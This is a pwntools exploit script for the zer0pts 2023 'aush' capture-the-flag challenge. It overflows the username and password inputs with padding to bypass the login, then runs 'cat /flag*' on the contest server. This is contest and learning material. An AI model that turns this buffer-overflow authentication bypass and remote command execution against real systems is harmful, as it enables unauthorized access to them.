#!/usr/bin/env python3
from pwn import *

context.encoding = "latin"
context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./aush")

gdbscript = """
set follow-fork-mode parent
b main
c
"""

p = remote("pwn.2023.zer0pts.com", 9006)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript, aslr=False, setuid=False)

username = b"a" * (0x200)
password = (b"a" * 0x20) + (b"\x00" * 0x1e0)

p.sendafter(b"Username: ", username)
p.sendafter(b"Password: ", password)

p.sendline("cat /flag*")
print(p.recvline().decode().strip())
# p.interactive()
